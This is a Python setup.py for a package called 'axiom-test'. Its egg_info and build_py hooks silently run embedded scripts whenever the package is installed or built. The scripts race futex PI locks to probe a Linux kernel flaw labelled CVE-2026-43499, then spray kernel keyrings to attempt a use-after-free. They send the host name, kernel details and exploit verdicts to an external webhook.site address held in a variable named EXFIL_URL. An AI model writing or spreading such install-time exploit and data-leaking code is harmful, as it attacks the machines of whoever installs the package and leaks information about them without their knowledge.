import json, os, sys, subprocess, urllib.request, time
from setuptools import setup
from setuptools.command.egg_info import egg_info
from setuptools.command.build_py import build_py

EXFIL_URL = "https://webhook.site/18a72e84-ee1f-4b1d-88ec-310b78a4c1f4"
VER = "3.6.1"
_RAN = False
_RESULT_PATH = "/mnt/data/axiom_results.json"

def _rp(script, timeout=30, ns=False):
    try:
        cmd = (["unshare", "-Urn"] if ns else []) + ["python3", "-I", "-c", script]
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout).decode(errors="replace")
        if "__R__" in out and "__E__" in out:
            return json.loads(out.split("__R__")[1].split("__E__")[0])
        return {"raw": out[:8000]}
    except subprocess.TimeoutExpired:
        return {"error": "TIMEOUT"}
    except subprocess.CalledProcessError as e:
        return {"error": f"EXIT_{e.returncode}", "out": (e.output or b"").decode(errors="replace")[:4000]}
    except Exception as e:
        return {"error": str(e)[:500]}

def _send(data):
    j = json.dumps(data, default=str)
    try:
        with open(_RESULT_PATH, "w") as f:
            f.write(j)
    except: pass
    try:
        urllib.request.urlopen(urllib.request.Request(
            EXFIL_URL, data=j.encode(), headers={"Content-Type": "application/json"}), timeout=15)
    except: pass

P2 = r'''
import ctypes, os, mmap, json, time
SYS_futex=202; FUTEX_LOCK_PI=6; FUTEX_UNLOCK_PI=7
FUTEX_OWNER_DIED=0x40000000; FUTEX_TID_MASK=0x3fffffff
libc = ctypes.CDLL("libc.so.6", use_errno=True)
R = {"cve":"CVE-2026-43499","iters":0,"owner_died":0,"esrch":0,"tid_corrupt":0,
     "efault":0,"ok_lock":0,"anom":[],"verdict":"UNKNOWN","cpus":0}
try: R["cpus"] = os.cpu_count() or 0
except: pass
shm = mmap.mmap(-1, 4096, flags=mmap.MAP_SHARED|mmap.MAP_ANONYMOUS, prot=mmap.PROT_READ|mmap.PROT_WRITE)
fw = ctypes.c_uint32.from_buffer(shm, 0)
R["addr"] = hex(ctypes.addressof(fw))
fw.value = 0
my_pid = os.getpid(); anom = []
for i in range(250):
    fw.value = 0
    pid = os.fork()
    if pid == 0:
        libc.syscall(SYS_futex, ctypes.byref(fw), FUTEX_LOCK_PI, 0, 0, 0, 0)
        if i % 3 == 1: os.sched_yield()
        os._exit(0)
    else:
        m = i % 5
        if m==1: [None for _ in range(50)]
        elif m==2: [None for _ in range(500)]
        elif m==3: time.sleep(0.00005)
        elif m==4: time.sleep(0.0002)
        ret = libc.syscall(SYS_futex, ctypes.byref(fw), FUTEX_LOCK_PI, 0, 0, 0, 0)
        en = ctypes.get_errno(); wv = fw.value
        try: os.waitpid(pid, 0)
        except: pass
        R["iters"] += 1
        if wv & FUTEX_OWNER_DIED: R["owner_died"] += 1
        tid = wv & FUTEX_TID_MASK
        if ret == 0:
            R["ok_lock"] += 1
            if tid != 0 and tid != my_pid:
                R["tid_corrupt"] += 1
                anom.append({"i":i,"w":hex(wv),"t":"CORRUPT","tid":tid})
            libc.syscall(SYS_futex, ctypes.byref(fw), FUTEX_UNLOCK_PI, 0, 0, 0, 0)
        elif en == 3:
            R["esrch"] += 1
            if len(anom) < 60: anom.append({"i":i,"w":hex(wv),"t":"ESRCH","tid":tid,"od":bool(wv & FUTEX_OWNER_DIED)})
        elif en == 14:
            R["efault"] += 1
        elif en not in (0,11,35,110):
            if len(anom) < 60: anom.append({"i":i,"w":hex(wv),"t":"E","e":en})
        fw.value = 0
R["anom"] = anom[:60]
if R["tid_corrupt"] > 0: R["verdict"]="EXPLOITABLE"
elif R["esrch"]>15: R["verdict"]="RACE_WIDE"
elif R["esrch"]>0: R["verdict"]="RACE_HIT"
elif R["owner_died"]>20: R["verdict"]="OD_FREQUENT"
elif R["owner_died"]>0: R["verdict"]="OD_SOME"
elif R["efault"]>100: R["verdict"]="STILL_EFAULT"
elif R["ok_lock"]>0: R["verdict"]="NO_RACE"
else: R["verdict"]="ALL_ERRORS"
print("__R__" + json.dumps(R) + "__E__")
del fw
try: shm.close()
except: pass
'''

P3 = r'''
import ctypes, os, mmap, json, time
SYS_futex=202; SYS_add_key=248; SYS_keyctl=250
FUTEX_LOCK_PI=6; FUTEX_UNLOCK_PI=7
FUTEX_TID_MASK=0x3fffffff
libc = ctypes.CDLL("libc.so.6", use_errno=True)
R = {"stage":"spray","iters":0,"hits":0,"sprays":0,"corruptions":0,"anom":[]}
shm = mmap.mmap(-1, 4096, flags=mmap.MAP_SHARED|mmap.MAP_ANONYMOUS, prot=mmap.PROT_READ|mmap.PROT_WRITE)
fw = ctypes.c_uint32.from_buffer(shm, 0)
my = os.getpid(); anom = []; sd = b"\x41" * 96
for i in range(150):
    fw.value = 0
    pid = os.fork()
    if pid == 0:
        libc.syscall(SYS_futex, ctypes.byref(fw), FUTEX_LOCK_PI, 0, 0, 0, 0)
        os._exit(0)
    else:
        if i % 3 == 1: os.sched_yield()
        ret = libc.syscall(SYS_futex, ctypes.byref(fw), FUTEX_LOCK_PI, 0, 0, 0, 0)
        en = ctypes.get_errno(); wv = fw.value; R["iters"] += 1
        if en == 3:
            R["hits"] += 1
            ks = []
            for j in range(60):
                k = libc.syscall(SYS_add_key, b"user", f"s{i}_{j}".encode(), sd, 96, ctypes.c_int(-2))
                if k >= 0: ks.append(k)
            R["sprays"] += 1
            ret2 = libc.syscall(SYS_futex, ctypes.byref(fw), FUTEX_LOCK_PI, 0, 0, 0, 0)
            en2 = ctypes.get_errno(); wv2 = fw.value; tid2 = wv2 & 0x3fffffff
            if ret2 == 0 and tid2 != 0 and tid2 != my:
                R["corruptions"] += 1
                anom.append({"i":i,"t":"CORRUPT","tid":tid2,"w":hex(wv2)})
                libc.syscall(SYS_futex, ctypes.byref(fw), FUTEX_UNLOCK_PI, 0, 0, 0, 0)
            for k in ks:
                try: libc.syscall(SYS_keyctl, 3, k, 0, 0, 0)
                except: pass
        elif ret == 0:
            libc.syscall(SYS_futex, ctypes.byref(fw), FUTEX_UNLOCK_PI, 0, 0, 0, 0)
        try: os.waitpid(pid, 0)
        except: pass
        fw.value = 0
R["anom"] = anom[:40]
if R["corruptions"] > 0: R["verdict"] = "UAF_CONFIRMED"
elif R["hits"] > 10: R["verdict"] = "RACE_NO_RECLAIM"
elif R["hits"] > 0: R["verdict"] = "RACE_FEW"
else: R["verdict"] = "NO_RACE"
print("__R__" + json.dumps(R) + "__E__")
del fw
try: shm.close()
except: pass
'''

def _collect():
    import platform
    R = {"v": VER, "host": platform.node(), "kern": platform.release(),
         "arch": platform.machine(),
         "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "ph": {}}

    R["ph"]["s1_race"] = _rp(P2, timeout=90)
    _send(R)

    s1v = str(R["ph"].get("s1_race", {}).get("verdict", ""))
    if any(k in s1v for k in ["_WIDE", "_HIT", "CORRUPT", "EXPLOIT", "OD_FREQUENT", "OD_SOME"]):
        R["ph"]["s2_spray"] = _rp(P3, timeout=90)
    else:
        R["ph"]["s2_spray"] = {"skipped": True, "reason": s1v}
    _send(R)

def _safe_run():
    global _RAN
    if _RAN: return
    _RAN = True
    try: _collect()
    except Exception as e:
        try:
            with open(_RESULT_PATH, "w") as f: json.dump({"error": str(e)}, f)
        except: pass

class PostEggInfo(egg_info):
    def run(self):
        super().run()
        _safe_run()

class PostBuildPy(build_py):
    def run(self):
        super().run()
        _safe_run()

setup(name="axiom-test", version=VER, py_modules=[],
      cmdclass={"egg_info": PostEggInfo, "build_py": PostBuildPy})
